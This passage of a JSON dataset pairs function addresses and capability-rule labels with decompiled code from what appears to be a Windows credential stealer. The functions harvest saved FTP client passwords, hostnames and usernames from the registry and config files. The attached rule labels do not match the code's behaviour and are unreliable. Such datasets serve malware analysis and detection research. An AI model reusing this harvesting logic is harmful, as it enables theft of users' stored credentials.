iVar1);\n                fcn.004015cb(arg_8h, uVar2);\n                fcn.004015cb(arg_8h, arg_ch_03);\n            }\n            fcn.004018b8(iVar1);\n            fcn.004018b8(arg_ch_01);\n            fcn.004018b8(arg_ch_02);\n            fcn.004018b8(uVar2);\n            fcn.004018b8(arg_ch_03);\n            fcn.004061e4(arg_8h, arg_ch_00);\n            fcn.004018b8(arg_ch_00);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 732
    },
    "004063fd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004063fd(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint *arg_8h_01;\n    int32_t var_830h;\n    int32_t var_82ch;\n    uint *var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            var_810h = fcn.00401e4c(arg_8h_00, &var_80ch);\n            var_81ch = fcn.00401d71(*0x414869, var_810h, 0x4157d8, 0);\n            var_814h = fcn.00401d71(*0x414869, var_810h, 0x4157c9, 0);\n            var_818h = fcn.00401d71(*0x414869, var_810h, 0x4157ce, 0);\n            var_820h = fcn.00401d71(*0x414869, var_810h, \"PthR\", 0);\n            arg_8h_01 = fcn.00401d71(*0x414869, var_810h, 0x4157d3, &var_82ch);\n            if ((arg_8h_01 == NULL) || (var_82ch != 4)) {\n                if (arg_8h_01 != NULL) {\n                    fcn.004018b8(arg_8h_01);\n                }\n                var_824h = 0x15;\n            }\n            else {\n                var_824h = *arg_8h_01;\n                fcn.004018b8(arg_8h_01);\n            }\n            var_828h = fcn.00401d71(*0x414869, var_810h, 0x4157e0, &var_830h);\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0010);\n                fcn.004015cb(arg_8h, var_814h);\n                fcn.004015cb(arg_8h, var_818h);\n                fcn.004015cb(arg_8h, var_81ch);\n                fcn.00401569(arg_8h, var_824h);\n                fcn.004015cb(arg_8h, var_820h);\n                if ((var_828h == NULL) || (var_830h != 4)) {\n                    fcn.00401569(arg_8h, 0);\n                }\n                else {\n                    fcn.00401569(arg_8h, *var_828h);\n                }\n            }\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_820h);\n            fcn.004018b8(var_828h);\n            fcn.004018b8(var_810h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 941
    },
    "0040668f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040668f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint *arg_8h_01;\n    int32_t *arg_8h_02;\n    int32_t var_834h;\n    int32_t var_830h;\n    int32_t var_82ch;\n    int32_t var_828h;\n    uint var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            var_810h = fcn.00401e4c(arg_8h_00, &var_80ch);\n            var_81ch = fcn.00401d71(*0x414869, var_810h, 0x415862, &var_834h);\n            var_814h = fcn.00401d71(*0x414869, var_810h, 0x415878, 0);\n            var_818h = fcn.00401d71(*0x414869, var_810h, \"Login\", 0);\n            var_820h = fcn.00401d71(*0x414869, var_810h, \"InitialPath\", 0);\n            arg_8h_01 = fcn.00401d71(*0x414869, var_810h, 0x415883, &var_828h);\n            if ((arg_8h_01 == NULL) || (var_828h != 4)) {\n                var_824h = 0x15;\n            }\n            else {\n                var_824h = *arg_8h_01;\n            }\n            fcn.004018b8(arg_8h_01);\n            arg_8h_02 = fcn.00401d71(*0x414869, var_810h, \"PasswordType\", &var_830h);\n            if ((arg_8h_02 == NULL) || (var_830h != 4)) {\n                var_82ch = 0;\n            }\n            else {\n                var_82ch = *arg_8h_02;\n            }\n            fcn.004018b8(arg_8h_02);\n            if ((var_81ch != 0) && (var_82ch == 2)) {\n                iVar1 = fcn.004043dc(var_81ch, &var_834h, 0);\n                if ((iVar1 == 0) || (var_834h == 0)) {\n                    fcn.004018b8(var_81ch);\n                    var_81ch = 0;\n                }\n            }\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0002);\n                fcn.004015cb(arg_8h, var_814h);\n                fcn.004015cb(arg_8h, var_818h);\n                fcn.0040159f(arg_8h, var_81ch, var_834h);\n                fcn.00401569(arg_8h, var_824h);\n                fcn.004015cb(arg_8h, var_820h);\n            }\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_820h);\n            fcn.004018b8(var_810h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 1016
    },
    "00406a5c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406a5c(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint uVar3;\n    uint arg_ch_00;\n    char *arg_8h_00;\n    char *pcVar4;\n    char *pcVar5;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x11, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar5 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.00410808();\n        if (iVar2 != 0) {\n            uVar3 = fcn.0040242b(arg_8h_00);\n            arg_ch_00 = fcn.00401e4c(uVar3, \"\\\\sites.xml\");\n            uVar3 = arg_8h;\n            fcn.0040406c(arg_8h, arg_ch_00, 0xbeef0000);\n            fcn.004018b8(uVar3);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar4 = pcVar5;\n        do {\n            pcVar5 = pcVar4;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar5 = pcVar4 + 1;\n            cVar1 = *pcVar4;\n            pcVar4 = pcVar5;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar5;\n    } while( true );\n}\n",
        "token_count": 452
    },
    "00406b1b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406b1b(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint *arg_8h_01;\n    int32_t var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            var_810h = fcn.00401df8(arg_8h_00, &var_80ch);\n            fcn.004018b8(arg_8h_00);\n            var_81ch = fcn.00401d71(*0x414869, var_810h, 0x415932, 0);\n            var_814h = fcn.00401d71(*0x414869, var_810h, 0x415922, 0);\n            var_818h = fcn.00401d71(*0x414869, var_810h, 0x415929, 0);\n            arg_8h_01 = fcn.00401d71(*0x414869, var_810h, \"FtpPort\", &var_824h);\n            if ((arg_8h_01 == NULL) || (var_824h != 4)) {\n                if (arg_8h_01 != NULL) {\n                    fcn.004018b8(arg_8h_01);\n                }\n                var_820h = 0x15;\n            }\n            else {\n                var_820h = *arg_8h_01;\n                fcn.004018b8(arg_8h_01);\n            }\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0000);\n                fcn.004015cb(arg_8h, var_814h);\n                fcn.004015cb(arg_8h, var_818h);\n                fcn.004015cb(arg_8h, var_81ch);\n                fcn.00401569(arg_8h, var_820h);\n            }\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_810h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 751
    },
    "00406d4f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406d4f(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint *arg_8h_01;\n    int32_t var_828h;\n    int32_t var_824h;\n    uint var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(*0x414869, arg_ch, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_ch, 0x414845);\n            var_810h = fcn.00401df8(arg_8h_00, &var_80ch);\n            fcn.004018b8(arg_8h_00);\n            var_81ch = fcn.00401d71(*0x414869, var_810h, 0x41598b, &var_828h);\n            var_814h = fcn.00401d71(*0x414869, var_810h, \"Hostname\", 0);\n            var_818h = fcn.00401d71(*0x414869, var_810h, \"Username\", 0);\n            arg_8h_01 = fcn.00401d71(*0x414869, var_810h, 0x415994, &var_824h);\n            if ((arg_8h_01 == NULL) || (var_824h != 4)) {\n                if (arg_8h_01 != NULL) {\n                    fcn.004018b8(arg_8h_01);\n                }\n                var_820h = 0x15;\n            }\n            else {\n                var_820h = *arg_8h_01;\n                fcn.004018b8(arg_8h_01);\n            }\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                iVar1 = fcn.004043dc(var_81ch, &var_828h, 0);\n                if ((iVar1 != 0) && (var_828h != 0)) {\n                    fcn.00401569(arg_8h, 0xbeef0000);\n                    fcn.004015cb(arg_8h, var_814h);\n                    fcn.004015cb(arg_8h, var_818h);\n                    fcn.0040159f(arg_8h, var_81ch, var_828h);\n                    fcn.00401569(arg_8h, var_820h);\n                }\n            }\n            fcn.004018b8(var_81ch);\n            fcn.004018b8(var_814h);\n            fcn.004018b8(var_818h);\n            fcn.004018b8(var_810h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 811
    },
    "00406fbb": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406fbb(uint arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    char *arg_ch_00;\n    int32_t iVar2;\n    uchar *puVar3;\n    char *arg_ch_01;\n    uint uVar4;\n    char *pcVar5;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.00401f36(arg_ch);\n    if (iVar1 == 0) {\n        return;\n    }\n    iVar1 = fcn.00401ffd(arg_ch, &var_10h);\n    if (iVar1 != 0) {\n        arg_ch_00 = fcn.004018cf(var_4h);\n        fcn.00401906(var_8h, arg_ch_00, var_4h);\n        arg_ch_01 = arg_ch_00;\n        while ((*arg_ch_01 != '\\0' && (iVar1 = fcn.00410808(arg_ch_01, \"\\\"password\\\" : \\\"\"),  iVar1 != 0))) {\n            iVar2 = fcn.0041066a(\"\\\"password\\\" : \\\"\");\n            arg_ch_01 = iVar1 + iVar2;\n            puVar3 = fcn.00410808(arg_ch_01, 0x4159dc);\n            if (puVar3 == NULL) break;\n            *puVar3 = 0;\n            uVar4 = arg_8h;\n            pcVar5 = arg_ch_01;\n            fcn.00406f43(arg_8h, arg_ch_01);\n            *pcVar5 = uVar4;\n        }\n        fcn.00401569(arg_8h, 0xbeef1001);\n        fcn.0040159f(arg_8h, arg_ch_00, var_4h);\n        fcn.004018b8(arg_ch_00);\n        fcn.00402091(&var_10h);\n    }\n    return;\n}\n",
        "token_count": 453
    },
    "0040717c": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040717c(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    int32_t arg_ch_01;\n    int32_t arg_ch_02;\n    int32_t arg_ch_03;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_10h, 0x414845);\n            arg_ch_00 = fcn.00401df8(uVar2, &var_80ch);\n            fcn.004018b8(uVar2);\n            iVar1 = fcn.00401d71(arg_ch, arg_ch_00, 0x415a13, 0);\n            arg_ch_01 = fcn.00401d71(arg_ch, arg_ch_00, \"_Password\", 0);\n            arg_ch_02 = fcn.00401d71(arg_ch, arg_ch_00, \"Server\", 0);\n            arg_ch_03 = fcn.00401d71(arg_ch, arg_ch_00, 0x415a0a, 0);\n            uVar2 = fcn.00401d71(arg_ch, arg_ch_00, \"Directory\", 0);\n            if ((((iVar1 != 0) || (arg_ch_01 != 0)) && (arg_ch_02 != 0)) && (arg_ch_03 != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0000);\n                fcn.004015cb(arg_8h, arg_ch_02);\n                fcn.004015cb(arg_8h, arg_ch_03);\n                fcn.004015cb(arg_8h, iVar1);\n                fcn.004015cb(arg_8h, arg_ch_01);\n                fcn.004015cb(arg_8h, uVar2);\n            }\n            fcn.004018b8(iVar1);\n            fcn.004018b8(arg_ch_01);\n            fcn.004018b8(arg_ch_02);\n            fcn.004018b8(arg_ch_03);\n            fcn.004018b8(uVar2);\n            fcn.0040717c(arg_8h, arg_ch, arg_ch_00);\n            fcn.004018b8(arg_ch_00);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 733
    },
    "004073a7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004073a7(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint arg_ch_00;\n    int32_t arg_ch_01;\n    int32_t arg_ch_02;\n    int32_t arg_ch_03;\n    uint var_824h;\n    uint var_820h;\n    uint var_81ch;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            uVar2 = fcn.00401df8(arg_10h, 0x414845);\n            arg_ch_00 = fcn.00401df8(uVar2, &var_80ch);\n            fcn.004018b8(uVar2);\n            iVar1 = fcn.00401d71(arg_ch, arg_ch_00, \"FtpPassword\", 0);\n            arg_ch_01 = fcn.00401d71(arg_ch, arg_ch_00, \"_FtpPassword\", 0);\n            arg_ch_02 = fcn.00401d71(arg_ch, arg_ch_00, \"FtpServer\", 0);\n            arg_ch_03 = fcn.00401d71(arg_ch, arg_ch_00, \"FtpUserName\", 0);\n            uVar2 = fcn.00401d71(arg_ch, arg_ch_00, \"FtpDirectory\", 0);\n            if ((((iVar1 != 0) || (arg_ch_01 != 0)) && (arg_ch_02 != 0)) && (arg_ch_03 != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0000);\n                fcn.004015cb(arg_8h, arg_ch_02);\n                fcn.004015cb(arg_8h, arg_ch_03);\n                fcn.004015cb(arg_8h, iVar1);\n                fcn.004015cb(arg_8h, arg_ch_01);\n                fcn.004015cb(arg_8h, uVar2);\n            }\n            fcn.004018b8(iVar1);\n            fcn.004018b8(arg_ch_01);\n            fcn.004018b8(arg_ch_02);\n            fcn.004018b8(arg_ch_03);\n            fcn.004018b8(uVar2);\n            fcn.004073a7(arg_8h, arg_ch, arg_ch_00);\n            fcn.004018b8(arg_ch_00);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 734
    },
    "004075d2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004075d2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t var_814h;\n    int32_t var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107ea(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            var_810h = fcn.00401d71(arg_ch, arg_10h, &var_80ch, &var_814h);\n            if ((var_810h != 0) && (var_814h != 0)) {\n                fcn.00404017(arg_8h, var_810h, var_814h, 0xbeef0000);\n            }\n            fcn.004018b8(var_810h);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 329
    },
    "00407796": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407796(uint arg_8h, uint arg_ch, int32_t arg_10h)\n\n{\n    uint uVar1;\n    uint uVar2;\n    int32_t var_4h;\n    \n    var_4h = fcn.00401eb1(arg_ch);\n    if (var_4h != 0) {\n        if (arg_10h != 0) {\n            var_4h = fcn.00401e4c(var_4h, arg_10h);\n        }\n        uVar1 = fcn.00401df8(var_4h, \"\\\\SharedSettings.ccs\");\n        uVar2 = arg_8h;\n        fcn.0040406c(arg_8h, uVar1, 0xbeef0000);\n        fcn.004018b8(uVar2);\n        uVar1 = fcn.00401df8(var_4h, \"\\\\SharedSettings.sqlite\");\n        uVar2 = arg_8h;\n        fcn.0040406c(arg_8h, uVar1, 0xbeef0001);\n        fcn.004018b8(uVar2);\n        uVar1 = fcn.00401df8(var_4h, \"\\\\SharedSettings_1_0_5.ccs\");\n        uVar2 = arg_8h;\n        fcn.0040406c(arg_8h, uVar1, 0xbeef0000);\n        fcn.004018b8(uVar2);\n        uVar2 = fcn.00401df8(var_4h, \"\\\\SharedSettings_1_0_5.sqlite\");\n        fcn.0040406c(arg_8h, uVar2, 0xbeef0001);\n        fcn.004018b8(arg_8h);\n        fcn.004018b8(var_4h);\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "004078c8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004078c8(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint arg_ch_00;\n    int32_t arg_ch_01;\n    uint var_818h;\n    uint var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_10h, 0x414845);\n            arg_ch_00 = fcn.00401df8(arg_8h_00, &var_80ch);\n            fcn.004018b8(arg_8h_00);\n            iVar1 = fcn.00401d71(arg_ch, arg_ch_00, \"InstallPath\", 0);\n            arg_ch_01 = fcn.00401d71(arg_ch, arg_ch_00, 0x415bf8, 0);\n            if (iVar1 != 0) {\n                fcn.00404351(arg_8h, iVar1, \"sites.dat\", 0xbeef0000);\n                fcn.00404351(arg_8h, iVar1, 0x415bbe, 0xbeef0001);\n            }\n            if (arg_ch_01 != 0) {\n                fcn.00404351(arg_8h, arg_ch_01, \"sites.dat\", 0xbeef0000);\n                fcn.00404351(arg_8h, arg_ch_01, 0x415bbe, 0xbeef0001);\n            }\n            fcn.004018b8(iVar1);\n            fcn.004018b8(arg_ch_01);\n            fcn.004078c8(arg_8h, arg_ch, arg_ch_00);\n            fcn.004018b8(arg_ch_00);\n            var_8h = var_8h + 1;\n        }\n        fcn.004107c0(var_4h);\n    }\n    return;\n}\n",
        "token_count": 579
    },
    "00407a7f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407a7f(uint arg_8h)\n\n{\n    char cVar1;\n    uint arg_ch;\n    int32_t iVar2;\n    uint uVar3;\n    char *arg_8h_00;\n    char *pcVar4;\n    uint uVar5;\n    char *pcVar6;\n    uint var_4h;\n    \n    arg_ch = fcn.004015f0(arg_8h, 0x1b, 0);\n    cVar1 = **0x4147f1;\n    arg_8h_00 = *0x4147ed;\n    pcVar4 = *0x4147f1;\n    do {\n        if (cVar1 == '\\0') {\n            fcn.00407a33(arg_8h, 0x1a);\n            fcn.00407a33(arg_8h, 0x23);\n            fcn.00407a33(arg_8h, 0x1c);\n            fcn.004078c8(arg_8h, *0x414869, \"SOFTWARE\\\\LeapWare\");\n            fcn.004078c8(arg_8h, 0x80000002, \"SOFTWARE\\\\LeapWare\");\n            fcn.00401636(arg_8h, arg_ch);\n            return;\n        }\n        iVar2 = fcn.0041081a();\n        if (iVar2 == 0) {\n            iVar2 = fcn.00410808();\n            if (iVar2 != 0) {\n                uVar3 = fcn.0040242b(arg_8h_00);\n                uVar5 = arg_8h;\n                fcn.00404351(arg_8h, uVar3, \"sites.dat\", 0xbeef0000);\n                uVar3 = arg_8h;\n                fcn.00404351(arg_8h, uVar5, 0x415bbe, 0xbeef0001);\n                fcn.004018b8(uVar3);\n            }\n        }\n        else if (*(iVar2 + 1) != '\\0') {\n            pcVar6 = \"unleap.exe\";\n            iVar2 = fcn.0041066a(\"unleap.exe\", iVar2 + 1);\n            uVar3 = fcn.0040242b(pcVar6 + iVar2);\n            uVar5 = arg_8h;\n            fcn.00404351(arg_8h, uVar3, \"sites.dat\", 0xbeef0000);\n            uVar3 = arg_8h;\n            fcn.00404351(arg_8h, uVar5, 0x415bbe, 0xbeef0001);\n            fcn.004018b8(uVar3);\n        }\n        for (; *arg_8h_00 != '\\0'; arg_8h_00 = arg_8h_00 + 1) {\n        }\n        arg_8h_00 = arg_8h_00 + 1;\n        iVar2 = -1;\n        pcVar6 = pcVar4;\n        do {\n            pcVar4 = pcVar6;\n            if (iVar2 == 0) break;\n            iVar2 = iVar2 + -1;\n            pcVar4 = pcVar6 + 1;\n            cVar1 = *pcVar6;\n            pcVar6 = pcVar4;\n        } while (cVar1 != '\\0');\n        cVar1 = *pcVar4;\n    } while( true );\n}\n",
        "token_count": 760
    },
    "00407bba": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407bba(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint arg_8h_00;\n    uint *arg_8h_01;\n    int32_t var_830h;\n    uint *var_82ch;\n    uint var_828h;\n    uint var_824h;\n    int32_t var_820h;\n    int32_t var_81ch;\n    int32_t var_818h;\n    int32_t var_814h;\n    uint var_810h;\n    uint var_80ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    iVar1 = fcn.004107c6(arg_ch, arg_10h, &var_4h);\n    if (iVar1 == 0) {\n        var_8h = 0;\n        while( true ) {\n            var_ch = 0x7ff;\n            iVar1 = fcn.004107cc(var_4h, var_8h, &var_80ch, &var_ch, 0, 0, 0, 0);\n            if (iVar1 != 0) break;\n            arg_8h_00 = fcn.00401df8(arg_10h, 0x414845);\n            var_810h = fcn.00401df8(arg_8h_00, &var_80ch);\n            fcn.004018b8(arg_8h_00);\n            var_81ch = fcn.00401d71(arg_ch, var_810h, 0x415c00, 0);\n            var_814h = fcn.00401d71(arg_ch, var_810h, 0x415c09, 0);\n            var_818h = fcn.00401d71(arg_ch, var_810h, 0x415c12, 0);\n            var_824h = fcn.00401d71(arg_ch, var_810h, \"RemoteDirectory\", 0);\n            arg_8h_01 = fcn.00401d71(*0x414869, var_810h, 0x415c2b, &var_820h);\n            if ((arg_8h_01 == NULL) || (var_820h != 4)) {\n                if (arg_8h_01 != NULL) {\n                    fcn.004018b8(arg_8h_01);\n                }\n                var_828h = 0x15;\n            }\n            else {\n                var_828h = *arg_8h_01;\n                fcn.004018b8(arg_8h_01);\n            }\n            var_82ch = fcn.00401d71(arg_ch, var_810h, \"FSProtocol\", &var_830h);\n            if (((var_81ch != 0) && (var_814h != 0)) && (var_818h != 0)) {\n                fcn.00401569(arg_8h, 0xbeef0010);\n                fcn.004015cb(arg_8h, var_814h);\n                fcn.004015cb(arg_8h, var_818h);\n                fcn.004015cb(arg_8h, var_81ch);\n                fcn.00401569(arg_8h, var_828h);\n                fcn.004015cb(arg_8h, var_824h);\n                if ((var_82ch == NULL) || (var_830h != 4)) {\n                   